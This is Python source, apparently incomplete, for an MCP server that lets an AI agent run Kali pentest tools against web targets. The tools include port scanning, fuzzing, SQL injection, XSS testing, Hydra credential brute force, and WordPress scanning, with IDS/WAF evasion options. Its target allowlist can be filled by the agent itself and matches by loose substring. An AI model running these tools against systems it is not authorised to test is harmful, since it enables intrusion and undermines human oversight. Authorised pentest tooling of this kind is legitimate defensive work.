"""
Kali Security Bridge — MCP Server v3

Exposes offensive security tools executed inside the kali-mcp-box container
via Docker exec. All commands are passed as a list of strings: Docker uses
execve() directly, without /bin/sh, so shell metacharacters (;, &&, |, $(...))
are harmless on the host.

v3 features:
    - 25 tools covering the full OWASP web pentest lifecycle
    - Per-target SQLite persistence (~/.kali-mcp/findings.db)
    - Allowlist of authorized targets (required before any scan)
    - Audit log of every execution (~/.kali-mcp/audit.log)
    - Per-tool rate limiting to prevent accidental overload
    - Autonomous orchestration via run_full_pentest() with 16 phases
    - Automatic Markdown or JSON report generation
    - WPScan + xmlrpc.php for deep WordPress auditing
    - Exposed sensitive file detection
    - Structured analysis of security headers and cookie flags
    - Fast fuzzing with ffuf (dirs, GET/POST params, APIs)
    - Custom HTTP requests for evidence verification
    - Proof-of-concept for unrestricted PHP file upload
    - Direct enumeration of exposed MySQL (databases, users, wp_users hashes)

Usage:
    uv run server.py          (stdio — local integration, e.g. Claude Code)
    fastmcp dev server.py     (dev mode with web inspector)

    KALI_MCP_TRANSPORT=http uv run server.py
        Runs over HTTP (streamable) for remote access via Tailscale, e.g.
        from a Claude Desktop instance running on another machine on the
        tailnet.
        Variables:
          KALI_MCP_TRANSPORT=http   (default: stdio)
          KALI_MCP_HOST             (default: 127.0.0.1 — set to this
                                      machine's Tailscale IP to expose only
                                      on the tailnet, never 0.0.0.0)
          KALI_MCP_PORT             (default: 8765)
"""

from __future__ import annotations

import json
import logging
import os
import re
import shlex
import sqlite3
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Any

import docker
from docker.errors import APIError, DockerException, NotFound
from fastmcp import FastMCP
from pydantic import BaseModel

# ── Server ───────────────────────────────────────────────────────────────────

# Auth (AWS Cognito) is only required in remote HTTP mode — local stdio use
# (Claude Code on this machine) stays login-free, since the OS itself
# already controls who can spawn the process.
_auth = None
if os.environ.get("KALI_MCP_TRANSPORT", "stdio").lower() == "http":
    from fastmcp.server.auth.providers.aws import AWSCognitoProvider

    _auth = AWSCognitoProvider(
        user_pool_id=os.environ["COGNITO_USER_POOL_ID"],
        aws_region=os.environ.get("COGNITO_REGION", "us-east-1"),
        client_id=os.environ["COGNITO_CLIENT_ID"],
        client_secret=os.environ["COGNITO_CLIENT_SECRET"],
        base_url=os.environ["KALI_MCP_PUBLIC_URL"],
    )

mcp = FastMCP(
    name="kali-security-bridge",
    instructions=(
        "Complete security testing automation server. "
        "Connects to a Kali Linux container and runs tools covering the full web pentest lifecycle: "
        "recon → enumeration → web analysis → exploitation → report. "
        "REQUIRED: add the target to the allowlist before any scan. "
        "Always follow this order: check_target_online → scan_ports_nmap → web tools → exploitation → generate_report."
    ),
    auth=_auth,
)

# ── Configuration ────────────────────────────────────────────────────────────

CONTAINER_NAME = "kali-mcp-box"
BASE_DIR       = Path.home() / ".kali-mcp"
WORKSPACE_DIR  = BASE_DIR / "workspaces"
DB_PATH        = BASE_DIR / "findings.db"
LOG_PATH       = BASE_DIR / "audit.log"
OUTPUTS_DIR    = Path.home() / "mcps/outputs/kali-mcp"

BASE_DIR.mkdir(parents=True, exist_ok=True)
WORKSPACE_DIR.mkdir(parents=True, exist_ok=True)
OUTPUTS_DIR.mkdir(parents=True, exist_ok=True)

# Real browser User-Agent for WAF/IDS evasion
_STEALTH_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
_STEALTH_HEADERS = [
    "-H", f"User-Agent: {_STEALTH_UA}",
    "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "-H", "Accept-Language: en-US,en;q=0.9",
    "-H", "Accept-Encoding: gzip, deflate",
]

# Minimum interval in seconds between calls to the same tool (rate limiting)
_RATE_LIMITS: dict[str, float] = {
    "ping":      1.0,
    "nmap":      5.0,
    "subfinder": 3.0,
    "gobuster":  3.0,
    "katana":    3.0,
    "nikto":     3.0,
    "testssl":   3.0,
    "nuclei":    5.0,
    "dalfox":    3.0,
    "hydra":    10.0,
    "sqlmap":    5.0,
    "gowitness": 2.0,
    "wpscan":   10.0,
    "curl":      1.0,
    "ffuf":      3.0,
    "mysql":     2.0,
}
_last_call_time: dict[str, float] = {}


# ── Output persistence ───────────────────────────────────────────────────────


def _target_output_dir(target: str) -> Path:
    """Returns (and creates) ~/mcps/outputs/kali-mcp/<host>/ for the target."""
    host = target.lower().split("://")[-1].split("/")[0].split(":")[0]
    safe = re.sub(r"[^\w\-.]", "_", host)
    d = OUTPUTS_DIR / safe
    d.mkdir(parents=True, exist_ok=True)
    return d


def _save_scan_output(result: ExecResult) -> None:
    """Persists output + updates session.json. Never raises."""
    try:
        out_dir = _target_output_dir(result.target)
        ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname   = f"{result.tool}_{ts}.txt"
        body    = result.output or ""
        if result.error:
            body += f"\n\n[ERROR] {result.error}"
        (out_dir / fname).write_text(body, encoding="utf-8")

        session_path = out_dir / "session.json"
        session = (
            json.loads(session_path.read_text(encoding="utf-8"))
            if session_path.exists()
            else {"target": out_dir.name, "started": datetime.now().isoformat(), "scans": []}
        )
        session["scans"].append({
            "tool":      result.tool,
            "file":      fname,
            "success":   result.success,
            "exit_code": result.exit_code,
            "timestamp": datetime.now().isoformat(),
        })
        session["last_updated"] = datetime.now().isoformat()
        session_path.write_text(json.dumps(session, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass  # persistence must never interrupt the scan

# ── Logging / audit ──────────────────────────────────────────────────────────

logging.basicConfig(
    filename=str(LOG_PATH),
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
_audit = logging.getLogger("audit")

# ── Models ───────────────────────────────────────────────────────────────────


class ExecResult(BaseModel):
    """Standardized result of any execution inside the Kali container."""

    tool:      str
    target:    str
    exit_code: int
    success:   bool
    output:    str
    error:     str | None = None


# ── Database ─────────────────────────────────────────────────────────────────


def _init_db() -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS findings (
                id        INTEGER PRIMARY KEY AUTOINCREMENT,
                tool      TEXT    NOT NULL,
                target    TEXT    NOT NULL,
                timestamp TEXT    NOT NULL,
                exit_code INTEGER NOT NULL,
                success   INTEGER NOT NULL,
                output    TEXT,
                error     TEXT
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS allowlist (
                id    INTEGER PRIMARY KEY AUTOINCREMENT,
                entry TEXT    NOT NULL UNIQUE,
                added TEXT    NOT NULL,
                note  TEXT
            )
        """)
        conn.commit()


_init_db()


def _save_finding(result: ExecResult) -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            "INSERT INTO findings (tool, target, timestamp, exit_code, success, output, error) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (
                result.tool,
                result.target,
                datetime.now().isoformat(),
                result.exit_code,
                int(result.success),
                result.output,
                result.error,
            ),
        )
        conn.commit()


# ── Allowlist ────────────────────────────────────────────────────────────────


def _is_allowed(target: str) -> bool:
    """Checks whether the target (IP, hostname, or URL) is in the allowlist."""
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute("SELECT entry FROM allowlist").fetchall()

    if not rows:
        return False

    # Normalize: strip URL scheme and port to compare host/IP only
    normalized = target.lower().split("://")[-1].split("/")[0].split(":")[0]
    entries = [r[0].lower() for r in rows]
    return any(
        normalized == e or normalized.endswith(f".{e}") or e in normalized
        for e in entries
    )


# ── Rate limiting ────────────────────────────────────────────────────────────


def _rate_limit(tool_name: str) -> None:
    now      = time.monotonic()
    interval = _RATE_LIMITS.get(tool_name, 2.0)
    wait     = interval - (now - _last_call_time.get(tool_name, 0.0))
    if wait > 0:
        time.sleep(wait)
    _last_call_time[tool_name] = time.monotonic()


# ── Docker helpers ───────────────────────────────────────────────────────────


def _get_container() -> docker.models.containers.Container:
    try:
        client = docker.from_env()
    except DockerException as exc:
        raise RuntimeError(
            "Could not connect to Docker. "
            "Check that the daemon is running: sudo systemctl start docker"
        ) from exc

    try:
        container = client.containers.get(CONTAINER_NAME)
    except NotFound:
        raise RuntimeError(
            f"Container '{CONTAINER_NAME}' not found. "
            "Build and start it: cd ~/mcps/kali-mcp && docker compose up -d --build"
        )

    if container.status != "running":
        raise RuntimeError(
            f"Container '{CONTAINER_NAME}' exists but is not running "
            f"(status: {container.status}). Run: docker compose up -d"
        )

    return container


def _exec_in_kali(
    cmd: list[str],
    tool_name: str,
    target: str,
    skip_allowlist: bool = False,
) -> ExecResult:
    """
    Executes cmd inside the Kali container via execve (no intermediate shell).
    Applies allowlist verification, rate limiting, and stores the result in the database.
    """
    if not cmd or not all(isinstance(a, str) for a in cmd):
        raise ValueError("`cmd` must be a non-empty list of strings.")

    if not skip_allowlist and not _is_allowed(target):
        result = ExecResult(
            tool=tool_name, target=target, exit_code=-1, success=False, output="",
            error=(
                f"Target '{target}' is not in the allowlist. "
                "Use manage_allowlist(action='add', entry='<target>') to authorize it."
            ),
        )
        _audit.warning("BLOCKED | tool=%s target=%s | not in allowlist", tool_name, target)
        return result

    _rate_limit(tool_name)

    try:
        container = _get_container()
        exit_code, raw = container.exec_run(
            cmd,
            demux=False,
            stdout=True,
            stderr=True,
        )
        output = raw.decode("utf-8", errors="replace").strip() if raw else ""
        result = ExecResult(
            tool=tool_name, target=target,
            exit_code=exit_code, success=(exit_code == 0), output=output,
        )

    except RuntimeError as exc:
        result = ExecResult(
            tool=tool_name, target=target,
            exit_code=-1, success=False, output="", error=str(exc),
        )
    except APIError as exc:
        result = ExecResult(
            tool=tool_name, target=target,
            exit_code=-1, success=False, output="",
            error=f"Docker API error: {exc.explanation}",
        )

    _audit.info(
        "tool=%s target=%s exit_code=%d success=%s",
        tool_name, target, result.exit_code, result.success,
    )
    _save_finding(result)
    _save_scan_output(result)
    return result


# ── MCP tools ────────────────────────────────────────────────────────────────


@mcp.tool()
def manage_allowlist(
    action: str,
    entry: str = "",
    note: str = "",
) -> dict[str, Any]:
    """
    Manages the allowlist of targets authorized for testing.

    NO scanning tool will work unless the target is listed here.
    Always configure this before starting a pentest.

    Args:
        action: "add" | "remove" | "list"
        entry:  IP, hostname, or domain. E.g.: "192.168.1.10", "app.local", "example.com"
        note:   Authorization context. E.g.: "staging server — authorized by John on 2025-05-18"

    Returns:
        Operation result and the updated list of entries.
    """
    if action == "add":
        if not entry:
            return {"success": False, "error": "entry is required for action='add'"}
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT OR IGNORE INTO allowlist (entry, added, note) VALUES (?, ?, ?)",
                (entry.lower(), datetime.now().isoformat(), note),
            )
            conn.commit()
        _audit.info("ALLOWLIST ADD | entry=%s note=%s", entry, note)
        return {"success": True, "action": "add", "entry": entry}

    if action == "remove":
        if not entry:
            return {"success": False, "error": "entry is required for action='remove'"}
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute("DELETE FROM allowlist WHERE entry = ?", (entry.lower(),))
            conn.commit()
        _audit.info("ALLOWLIST REMOVE | entry=%s", entry)
        return {"success": True, "action": "remove", "entry": entry}

    if action == "list":
        with sqlite3.connect(DB_PATH) as conn:
            rows = conn.execute(
                "SELECT entry, added, note FROM allowlist ORDER BY added"
            ).fetchall()
        return {
            "success": True,
            "allowlist": [{"entry": r[0], "added": r[1], "note": r[2]} for r in rows],
            "total": len(rows),
        }

    return {"success": False, "error": f"invalid action: '{action}'. Use 'add', 'remove', or 'list'"}


@mcp.tool()
def check_target_online(target: str) -> dict[str, Any]:
    """
    Checks whether the target responds to ping before starting any scan.
    Use this as the first check to avoid unnecessary scans.

    Args:
        target: IP or hostname. E.g.: "192.168.1.10", "app.example.com"
    """
    cmd = ["ping", "-c", "3", "-W", "2", target]
    return _exec_in_kali(cmd, tool_name="ping", target=target).model_dump()


@mcp.tool()
def scan_ports_nmap(
    target: str,
    flags: str = "-sV -F",
    stealth: bool = False,
) -> dict[str, Any]:
    """
    Performs a port scan using Nmap. ALWAYS use this as the first phase.

    Common flags:
      "-sV -F"          → fast scan with version detection — default
      "-sV -O"          → versions + OS detection
      "-p 1-65535 -sV"  → all ports
      "-p 80,443,8080"  → specific ports
      "-A"              → aggressive (version, OS, NSE scripts, traceroute)
      "--script vuln"   → NSE vulnerability scripts

    Args:
        target:  IP, hostname, or CIDR. E.g.: "192.168.1.1", "10.0.0.0/24"
        flags:   Nmap flags (parsed via shlex, no shell interpretation).
        stealth: True = T2 timing + 1s scan-delay to avoid IDS/rate-limiting.
    """
    nmap_flags = shlex.split(flags)
    if stealth and "--scan-delay" not in flags:
        nmap_flags += ["--scan-delay", "1s", "-T2"]
    cmd = ["nmap"] + nmap_flags + [target]
    return _exec_in_kali(cmd, tool_name="nmap", target=target).model_dump()


@mcp.tool()
def enum_subdomains_subfinder(domain: str) -> dict[str, Any]:
    """
    Enumerates subdomains via passive reconnaissance using Subfinder.
    Use when the target is a public domain, after the initial Nmap scan.

    Args:
        domain: Root domain. E.g.: "example.com", "app.local"
    """
    cmd = ["subfinder", "-d", domain, "-silent"]
    return _exec_in_kali(cmd, tool_name="subfinder", target=domain).model_dump()


@mcp.tool()
def scan_directories_gobuster(
    target_url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "php,html,js,txt,bak,zip,env",
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Enumerates hidden directories and files using Gobuster.
    Use after identifying HTTP/HTTPS ports in Nmap, before Nikto.

    Wordlists available in the container:
      /usr/share/wordlists/dirb/common.txt                           → fast
      /usr/share/wordlists/dirb/big.txt                              → medium
      /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   → thorough

    Args:
        target_url: Base URL. E.g.: "http://192.168.1.10", "https://app.local:8443"
        wordlist:   Path to the wordlist inside the container.
        extensions: Comma-separated extensions to test.
        evasion:    True = 5 threads + 300ms delay + real browser User-Agent.
                    Use when the target has a WAF or rate limiting.
    """
    cmd = [
        "gobuster", "dir",
        "-u", target_url,
        "-w", wordlist,
        "-x", extensions,
        "-q", "--no-error", "--timeout", "15s",
    ]
    if evasion:
        cmd += ["-t", "5", "--delay", "300ms", "-a", _STEALTH_UA]
    else:
        cmd += ["-t", "20"]
    return _exec_in_kali(cmd, tool_name="gobuster", target=target_url).model_dump()


@mcp.tool()
def crawl_application_katana(
    target_url: str,
    depth: int = 3,
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Crawls the web application to discover endpoints and parameters using Katana.
    Use after Gobuster. URLs with parameters in the output are candidates for
    Dalfox and SQLMap.

    Args:
        target_url: Base URL. E.g.: "http://192.168.1.10"
        depth:      Crawl depth (1-5). Default: 3
        evasion:    True = 5 req/s rate limit + real browser headers.
    """
    if not 1 <= depth <= 5:
        raise ValueError("depth must be between 1 and 5")
    cmd = [
        "katana",
        "-u", target_url,
        "-d", str(depth),
        "-silent",
        "-jc",
        "-xhr",
        "-kf", "all",
        "-timeout", "30",
        "-retry", "2",
    ]
    if evasion:
        cmd += ["-rate-limit", "5", "-H", f"User-Agent: {_STEALTH_UA}"]
    return _exec_in_kali(cmd, tool_name="katana", target=target_url).model_dump()


@mcp.tool()
def scan_vulnerabilities_nikto(
    target_url: str,
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Runs a web vulnerability scan using Nikto.
    Use once Nmap identifies open HTTP/HTTPS ports.

    Detects: exposed sensitive files, missing headers, dangerous HTTP methods,
    outdated versions, XSS/injection vectors, weak SSL/TLS.

    Args:
        target_url: Full URL. E.g.: "http://192.168.1.10", "https://app.local:8443"
        evasion:    True = browser User-Agent + 2s pause between tests.
    """
    cmd = [
        "nikto",
        "-h", target_url,
        "-nointeractive",
        "-maxtime", "180s",
    ]
    if evasion:
        cmd += ["-useragent", _STEALTH_UA, "-pause", "2"]
    return _exec_in_kali(cmd, tool_name="nikto", target=target_url).model_dump()


@mcp.tool()
def scan_ssl_testssl(target: str, port: int = 443) -> dict[str, Any]:
    """
    Analyzes SSL/TLS configuration using testssl.sh.
    Use when Nmap identifies port 443 or another HTTPS service.

    Detects: weak protocols (SSLv2/v3, TLS 1.0/1.1), weak ciphers,
    BEAST/POODLE/HEARTBLEED, invalid/expired certificates, missing HSTS.

    Args:
        target: IP or hostname. E.g.: "192.168.1.10", "app.example.com"
        port:   HTTPS port. Default: 443
    """
    cmd = [
        "testssl.sh",
        "--quiet",
        "--color", "0",
        "--fast",
        f"{target}:{port}",
    ]
    return _exec_in_kali(cmd, tool_name="testssl", target=target).model_dump()


@mcp.tool()
def scan_nuclei(
    target_url: str,
    severity: str = "medium,high,critical",
    tags: str = "",
) -> dict[str, Any]:
    """
    Detects CVEs and known vulnerabilities via templates using Nuclei.
    Use after Nikto to cover specific CVEs based on identified versions.

    Args:
        target_url: Target URL. E.g.: "http://192.168.1.10"
        severity:   Severity filter. E.g.: "high,critical" | "medium,high,critical"
        tags:       Template tags to filter by. E.g.: "wordpress", "apache", "xss,sqli"
                    Leave empty to use all templates for the given severity.
    """
    cmd = [
        "nuclei",
        "-u", target_url,
        "-severity", severity,
        "-silent",
        "-no-color",
        "-timeout", "10",
        "-rate-limit", "20",
        "-H", f"User-Agent: {_STEALTH_UA}",
    ]
    if tags:
        cmd += ["-tags", tags]
    return _exec_in_kali(cmd, tool_name="nuclei", target=target_url).model_dump()


@mcp.tool()
def scan_xss_dalfox(target_url: str) -> dict[str, Any]:
    """
    Tests for Cross-Site Scripting (XSS) using Dalfox.
    Use when the URL contains GET parameters or Katana discovers forms.

    Detects: Reflected XSS, DOM XSS, WAF filter bypass.

    Args:
        target_url: URL with parameters. E.g.: "http://app.local/search?q=test"
    """
    cmd = [
        "dalfox",
        "url", target_url,
        "--no-color",
        "--silence",
        "--timeout", "30",
        "--worker", "10",
    ]
    return _exec_in_kali(cmd, tool_name="dalfox", target=target_url).model_dump()


@mcp.tool()
def brute_force_hydra(
    target: str,
    service: str,
    port: int,
    userlist: str = "/usr/share/wordlists/unix_users.txt",
    passlist: str = "/usr/share/wordlists/rockyou.txt",
    http_form_path: str = "/wp-login.php",
    http_form_data: str = "log=^USER^&pwd=^PASS^&wp-submit=Log+In",
    http_form_fail: str = "ERROR",
) -> dict[str, Any]:
    """
    Tests weak credentials against authentication services using Hydra.
    Use when Nmap identifies SSH, FTP, HTTP-Auth, RDP, or Telnet.

    WARNING: may lock accounts or trigger alerts. Use only in authorized environments.

    Valid services: ssh, ftp, http-get, http-post-form, rdp, telnet, smtp, pop3, imap, smb

    For http-post-form, configure:
      http_form_path: form path. E.g.: "/wp-login.php", "/login"
      http_form_data: form fields with ^USER^ and ^PASS^.
                      E.g.: "log=^USER^&pwd=^PASS^&wp-submit=Log+In"
      http_form_fail: string present in the response on failure.
                      E.g.: "ERROR", "Invalid", "incorrect"

    Args:
        target:         IP or hostname of the target.
        service:        Service to test. E.g.: "ssh", "ftp", "http-post-form"
        port:           Service port.
        userlist:       Username wordlist inside the container.
        passlist:       Password wordlist inside the container.
        http_form_path: Form path (http-post-form only).
        http_form_data: POST fields with ^USER^ and ^PASS^ (http-post-form only).
        http_form_fail: Failure string in the response (http-post-form only).
    """
    _ALLOWED_SERVICES = {"ssh", "ftp", "http-get", "http-post-form", "rdp", "telnet", "smtp", "pop3", "imap", "smb"}
    if service not in _ALLOWED_SERVICES:
        raise ValueError(f"Invalid service '{service}'. Valid values: {sorted(_ALLOWED_SERVICES)}")

    base_cmd = [
        "hydra",
        "-L", userlist,
        "-P", passlist,
        "-s", str(port),
        "-t", "4",
        "-f",
        "-q",
        target,
    ]

    if service == "http-post-form":
        form_param = f"{http_form_path}:{http_form_data}:{http_form_fail}"
        cmd = base_cmd + ["http-post-form", form_param]
    else:
        cmd = base_cmd + [service]

    return _exec_in_kali(cmd, tool_name="hydra", target=target).model_dump()


@mcp.tool()
def scan_sql_injection_sqlmap(
    target_url: str,
    risk: int = 1,
    level: int = 1,
) -> dict[str, Any]:
    """
    Tests for SQL Injection using SQLMap.
    Use when the URL contains GET/POST parameters or Nikto reports possible SQLi.

    Mandatory escalation — always start at the lowest level:
      Conservative: risk=1, level=1
      Moderate:     risk=2, level=3
      Maximum:      risk=3, level=5  ← may modify data, use only with explicit authorization

    Args:
        target_url: URL with parameters. E.g.: "http://app.local/user?id=1"
        risk:       Payload risk level (1-3). Default: 1
        level:      Test depth (1-5). Default: 1
    """
    if not 1 <= risk <= 3:
        raise ValueError(f"risk must be between 1 and 3. Got: {risk}")
    if not 1 <= level <= 5:
        raise ValueError(f"level must be between 1 and 5. Got: {level}")

    cmd = [
        "sqlmap",
        "-u", target_url,
        "--batch",
        "--random-agent",
        f"--risk={risk}",
        f"--level={level}",
        "--output-dir=/tmp/sqlmap-results",
    ]
    return _exec_in_kali(cmd, tool_name="sqlmap", target=target_url).model_dump()


@mcp.tool()
def screenshot_gowitness(target_url: str) -> dict[str, Any]:
    """
    Captures a screenshot of the web application to document evidence using Gowitness.
    Screenshots are saved to /tmp/gowitness/ inside the container.

    Args:
        target_url: URL to capture. E.g.: "http://192.168.1.10/admin"
    """
    cmd = [
        "gowitness",
        "scan", "single",
        "--url", target_url,
        "--screenshot-path", "/tmp/gowitness/",
        "--write-none",
    ]
    return _exec_in_kali(cmd, tool_name="gowitness", target=target_url).model_dump()


@mcp.tool()
def check_exposed_files(
    target_url: str,
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Checks for exposure of sensitive files and directories using Gobuster with a
    dedicated wordlist.

    Detects: .env, wp-config.php.bak, phpinfo.php, backup.zip, .git/, debug.log,
    composer.json, secrets.yml, database.sql, and dozens of other critical files.
    Use right after standard Gobuster for targeted leak coverage.

    Args:
        target_url: Base URL of the target. E.g.: "http://192.168.1.10", "http://vulnwp-app:8080"
        evasion:    True = 3 threads + 500ms delay + real User-Agent. Use on sites with a WAF.
    """
    cmd = [
        "gobuster", "dir",
        "-u", target_url,
        "-w", "/usr/share/wordlists/sensitive-paths.txt",
        "-q", "--no-error", "--timeout", "15s",
    ]
    if evasion:
        cmd += ["-t", "3", "--delay", "500ms", "-a", _STEALTH_UA]
    else:
        cmd += ["-t", "10"]
    return _exec_in_kali(cmd, tool_name="gobuster", target=target_url).model_dump()


@mcp.tool()
def scan_wordpress_wpscan(
    target_url: str,
    enumerate: str = "vp,vt,u",
    aggressive: bool = False,
) -> dict[str, Any]:
    """
    Runs a full WordPress audit using WPScan.
    Use when a WordPress site is identified (wp-login.php, wp-content/ in Gobuster/Nikto).

    Detects: vulnerable plugins and themes, enumerated users, weak passwords,
    enabled xmlrpc, insecure configurations, exposed backups.

    Args:
        target_url:  WordPress URL. E.g.: "http://192.168.1.10", "http://vulnwp-app:8080"
        enumerate:   What to enumerate. Default: "vp,vt,u" (vulnerable plugins, themes, users).
                     Options: "vp" vuln plugins, "ap" all plugins, "vt" vuln themes,
                              "at" all themes, "u" users, "cb" config backups, "dbe" DB exports
        aggressive:  True = aggressive mode (more thorough, slower and noisier).
    """
    cmd = [
        "wpscan",
        "--url", target_url,
        "--no-banner",
        "--no-update",
        "--disable-tls-checks",
        "--format", "cli-no-colour",
        "--enumerate", enumerate,
    ]
    if aggressive:
        cmd += ["--plugins-detection", "aggressive", "--themes-detection", "aggressive"]
    else:
        cmd += ["--plugins-detection", "passive"]

    return _exec_in_kali(cmd, tool_name="wpscan", target=target_url).model_dump()


@mcp.tool()
def make_http_request(
    url: str,
    method: str = "GET",
    headers: str = "",
    body: str = "",
    follow_redirects: bool = True,
    timeout: int = 15,
) -> dict[str, Any]:
    """
    Makes a custom HTTP request to check content, headers, or test payloads.
    Use to confirm exposed files (.env, phpinfo.php, backups), inspect endpoint
    responses, or send manual payloads during evidence verification.

    Args:
        url:               Full URL. E.g.: "http://192.168.1.10/.env"
        method:            HTTP method. Default: "GET". Others: "POST", "HEAD", "PUT"
        headers:           Extra headers, one per line.
                           E.g.: "Authorization: Bearer token\\nX-Custom: value"
        body:              Request body (for POST/PUT). E.g.: "user=admin&pass=test"
        follow_redirects:  Follow redirects. Default: True
        timeout:           Timeout in seconds. Default: 15
    """
    cmd = [
        "curl", "-s", "-i",
        "-X", method.upper(),
        "--max-time", str(timeout),
    ]
    if follow_redirects:
        cmd += ["-L"]
    for h in headers.splitlines():
        h = h.strip()
        if h:
            cmd += ["-H", h]
    if body:
        cmd += ["-d", body]
    cmd.append(url)
    return _exec_in_kali(cmd, tool_name="curl", target=url).model_dump()


@mcp.tool()
def check_security_headers(target_url: str) -> dict[str, Any]:
    """
    Analyzes HTTP security headers and cookie flags for the target.
    Returns a structured analysis: present, missing, or misconfigured headers,
    with severity (high/medium/low) for each finding.

    Checks: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options,
    Strict-Transport-Security, Referrer-Policy, Permissions-Policy,
    CORS (Access-Control-Allow-Origin), cookies (HttpOnly, Secure, SameSite).

    Args:
        target_url: Target URL. E.g.: "http://192.168.1.10", "https://app.local"
    """
    cmd = ["curl", "-s", "-I", "-L", "--max-time", "10", target_url]
    result = _exec_in_kali(cmd, tool_name="curl", target=target_url)

    headers: dict[str, str] = {}
    for line in result.output.splitlines():
        if ":" in line and not line.lower().startswith("http/"):
            key, _, val = line.partition(":")
            headers[key.strip().lower()] = val.strip()

    _SECURITY_HEADERS: dict[str, str] = {
        "content-security-policy":   "high",
        "x-frame-options":           "medium",
        "x-content-type-options":    "medium",
        "strict-transport-security": "high",
        "referrer-policy":           "low",
        "permissions-policy":        "low",
    }

    findings = []
    for header, severity in _SECURITY_HEADERS.items():
        value = headers.get(header)
        findings.append({
            "header":   header,
            "status":   "present" if value else "missing",
            "value":    value,
            "severity": "info" if value else severity,
            "detail":   "OK" if value else f"{header} not configured",
        })

    cors = headers.get("access-control-allow-origin")
    if cors == "*":
        findings.append({
            "header": "access-control-allow-origin", "status": "misconfigured",
            "value": cors, "severity": "high",
            "detail": "CORS wildcard — any origin can make authenticated requests",
        })
    elif cors:
        findings.append({
            "header": "access-control-allow-origin", "status": "present",
            "value": cors, "severity": "info",
            "detail": "CORS with a specific origin",
        })

    cookie_issues = []
    for line in result.output.splitlines():
        if line.lower().startswith("set-cookie:"):
            cookie_val = line[11:].strip()
            low = cookie_val.lower()
            issues = []
            if "httponly" not in low:
                issues.append("Missing HttpOnly — accessible via JS (XSS risk)")
            if "secure" not in low:
                issues.append("Missing Secure — sent over unencrypted HTTP")
            if "samesite" not in low:
                issues.append("Missing SameSite — vulnerable to CSRF")
            if issues:
                cookie_issues.append({"cookie": cookie_val[:100], "issues": issues})

    high   = sum(1 for f in findings if f["severity"] == "high")
    medium = sum(1 for f in findings if f["severity"] == "medium")

    return {
        "tool":             "curl-headers",
        "target":           target_url,
        "exit_code":        result.exit_code,
        "success":          result.success,
        "raw_headers":      result.output,
        "security_headers": findings,
        "cookie_issues":    cookie_issues,
        "summary": {
            "high":         high,
            "medium":       medium,
            "total_issues": high + medium + len(cookie_issues),
        },
    }


@mcp.tool()
def scan_fuzzing_ffuf(
    target_url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    param_name: str = "",
    method: str = "GET",
    match_codes: str = "200,301,302,403",
    filter_size: str = "",
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Fast fuzzing using ffuf. Faster and more flexible than gobuster.
    Supports directory fuzzing, GET/POST parameters, and REST API endpoints.

    Modes:
      Directories: target_url="http://app/FUZZ"  (put FUZZ directly in the URL)
      Parameters:  target_url="http://app/page" + param_name="id"  → generates ?id=FUZZ
      POST body:   method="POST" + param_name="username"

    Wordlists available:
      /usr/share/wordlists/dirb/common.txt                          → fast, general
      /usr/share/wordlists/dirb/big.txt                             → broad
      /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  → thorough
      /usr/share/wordlists/sensitive-paths.txt                      → sensitive files

    Args:
        target_url:   URL with FUZZ embedded, or base URL when param_name is given.
        wordlist:     Path to the wordlist inside the container.
        param_name:   Parameter to fuzz. Generates ?param=FUZZ (GET) or body param=FUZZ (POST).
        method:       HTTP method. Default: "GET"
        match_codes:  Status codes to report. Default: "200,301,302,403"
        filter_size:  Filter out responses of this exact size (bytes).
                      Use to hide a custom default 404 response.
        evasion:      True = 5 threads + 10 req/s rate limit + 200ms delay + real User-Agent.
                      Use when the target has a WAF or rate limiting.
    """
    if param_name:
        if method.upper() == "POST":
            fuzz_url  = target_url
            post_data = f"{param_name}=FUZZ"
        else:
            sep      = "&" if "?" in target_url else "?"
            fuzz_url = f"{target_url}{sep}{param_name}=FUZZ"
            post_data = ""
    else:
        fuzz_url  = target_url if "FUZZ" in target_url else f"{target_url}/FUZZ"
        post_data = ""

    cmd = [
        "ffuf",
        "-u", fuzz_url,
        "-w", wordlist,
        "-mc", match_codes,
        "-timeout", "10",
        "-noninteractive",
        "-s",
    ]
    if evasion:
        cmd += ["-t", "5", "-rate", "10", "-p", "0.2", "-H", f"User-Agent: {_STEALTH_UA}"]
    elif filter_size == "" and not param_name:
        cmd += ["-t", "20"]
    else:
        cmd += ["-t", "20"]

    if method.upper() == "POST":
        cmd += ["-X", "POST", "-d", post_data]
    if filter_size:
        cmd += ["-fs", filter_size]

    return _exec_in_kali(cmd, tool_name="ffuf", target=target_url).model_dump()


@mcp.tool()
def scan_xmlrpc_wordpress(target_url: str) -> dict[str, Any]:
    """
    Tests the WordPress xmlrpc.php endpoint for attack vectors.
    Use when WPScan or Nikto reports xmlrpc.php as accessible.

    Tests:
      - Existence and reachability of xmlrpc.php
      - Method enumeration via system.listMethods
      - Brute force via system.multicall — bypasses rate limiting (thousands of logins per request)
      - Credential confirmation via wp.getUsersBlogs

    Args:
        target_url: Base WordPress URL. E.g.: "http://192.168.1.10:8080"
    """
